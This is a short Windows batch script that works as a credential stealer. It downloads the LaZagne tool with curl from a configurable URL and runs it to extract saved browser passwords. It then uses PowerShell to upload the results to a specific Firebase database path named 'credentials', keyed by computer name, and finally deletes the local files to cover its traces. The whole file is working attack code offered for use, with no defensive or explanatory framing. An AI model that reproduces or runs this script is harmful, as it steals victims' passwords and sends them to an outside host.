@echo off
setlocal EnableDelayedExpansion

:: === CONFIGURABLE ===
set "LAZAGNE_URL=https://yourdomain.com/lazagne.exe"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app"

:: === TEMP FILES ===
set "LAZAGNE_FILE=lazagne.exe"
set "OUTPUT=result.txt"
set "COMP_NAME=%COMPUTERNAME%"

:: === STEP 1: Download lazagne ===
echo [*] Downloading LaZagne...
curl -o %LAZAGNE_FILE% %LAZAGNE_URL%

:: === STEP 2: Run lazagne on browsers ===
echo [*] Extracting browser passwords...
%LAZAGNE_FILE% browsers > %OUTPUT%

:: === STEP 3: Upload to Firebase ===
echo [*] Sending data to Firebase...
powershell -Command ^
    "$data = Get-Content '%OUTPUT%' | Out-String; " ^
    "$uri = '%FIREBASE_URL%/credentials/%COMP_NAME%.json'; " ^
    "Invoke-RestMethod -Uri $uri -Method PUT -Body ($data | ConvertTo-Json -Compress)"

:: === STEP 4: Cleanup (optional) ===
echo [*] Cleaning up...
del %OUTPUT%
del %LAZAGNE_FILE%

echo [*] Done.
pause
